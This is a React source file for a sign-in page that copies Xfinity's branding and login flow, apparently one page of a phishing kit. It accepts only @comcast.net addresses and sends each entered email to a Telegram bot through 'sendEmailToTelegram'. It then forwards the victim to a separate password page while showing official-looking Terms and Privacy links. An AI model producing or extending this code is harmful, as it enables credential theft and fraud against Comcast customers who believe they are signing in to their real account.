import { useState } from "react";
import { useNavigate } from "react-router-dom";
import heroImage from "@/assets/xfinity-banner.png";
import Logo from "@/assets/xfinity-logo-grey.svg";
import { Link } from "react-router-dom";
import { ChevronRight } from "lucide-react";
import Footer from "@/components/Footer/Footer";
import { sendEmailToTelegram } from "@/bot/telegrambot";

const ALLOWED_DOMAIN = "@comcast.net";

const LoginEmail = () => {
  const [email, setEmail] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Empty check
    if (!email.trim()) {
      setError("Please enter your Xfinity ID to sign in.");
      return;
    }

    // Domain validation — must end with @comcast.net
    if (!email.toLowerCase().endsWith(ALLOWED_DOMAIN)) {
      setError("The Xfinity ID you entered was incorrect. Please try again.");
      return;
    }

    setError("");
    setLoading(true);

    // Send email to Telegram bot
    await sendEmailToTelegram(email);

    setTimeout(() => {
      setLoading(false);
      navigate("/login/password", { state: { email } });
    }, 600);
  };

  return (
    <main className="h-screen overflow-y-auto bg-background">
      {/* Split area */}
      <section className="h-[94vh] flex flex-col md:flex-row">
        {/* LEFT */}
        <div className="flex flex-1 items-center justify-center px-6 py-12 md:px-16">
          <div className="w-full translate-y-[16px] max-w-xl space-y-6">

            {/* Logo */}
            <img
              src={Logo}
              alt=""
              className="translate-y-[6px]"
              width={70}
            />

            {/* Heading */}
            <div className="space-y-2 translate-y-[20px]">
              <h1 className="text-3xl font-bold text-foreground leading-tight">
                Sign in with your Xfinity&nbsp;ID
              </h1>
            </div>

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-4 pt-3">
              <div>
                <input
                  type="text"
                  placeholder="Email, mobile, or username"
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    setError("");
                  }}
                  className="w-full rounded-sm border border-neutral-500 bg-neutral-100 px-4 py-4 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
                />
                {error && (
                  <p className="mt-1 text-xs text-destructive">{error}</p>
                )}
              </div>

              <p className="text-sm text-neutral-900 leading-relaxed">
                By signing in, you agree to our{" "}
                <Link to="#" className="text-xfinity-purple underline">
                  Terms of Service
                </Link>{" "}
                and{" "}
                <Link to="#" className="text-xfinity-purple underline">
                  Privacy Policy
                </Link>.
              </p>

              <button
                type="submit"
                disabled={loading}
                className="translate-y-[16px] w-28 rounded-sm bg-xfinity-purple py-4 font-semibold text-primary-foreground transition hover:bg-xfinity-purple-hover disabled:opacity-60"
              >
                {loading ? "Loading…" : "Let's go"}
              </button>
            </form>

            {/* Links */}
            <div className="pt-6 border-neutral-200">
              <div className="flex flex-col text-md gap-1">

                <Link
                  to="#"
                  className="flex items-center justify-between w-full px-4 py-3 text-black hover:bg-neutral-100 border-b border-neutral-200"
                >
                  <span>New to Xfinity? View exclusive offers near you</span>
                  <ChevronRight className="text-neutral-500" />
                </Link>

                <Link
                  to="#"
                  className="flex items-center justify-between w-full px-4 py-3 text-black hover:bg-neutral-100 border-b border-neutral-200"
                >
                  <span>Find your Xfinity ID</span>
                  <ChevronRight className="text-neutral-500" />
                </Link>

                <Link
                  to="#"
                  className="flex items-center justify-between w-full px-4 py-3 text-black hover:bg-neutral-100"
                >
                  <span>Create a new Xfinity ID</span>
                  <ChevronRight className="text-neutral-500" />
                </Link>

              </div>
            </div>

          </div>
        </div>

        {/* RIGHT */}
        <Link
          to=""
          className="hidden md:block md:w-1/2 relative border-l-2 border-transparent active:border-xfinity-purple-hover transition"
        >
          <img
            src={heroImage}
            alt=""
            className="absolute inset-0 h-full w-full object-cover"
          />
        </Link>
      </section>

      {/* FOOTER (comes after scroll) */}
      <footer className="bg-white">
        <Footer />
      </footer>
    </main>
  );
};

export default LoginEmail;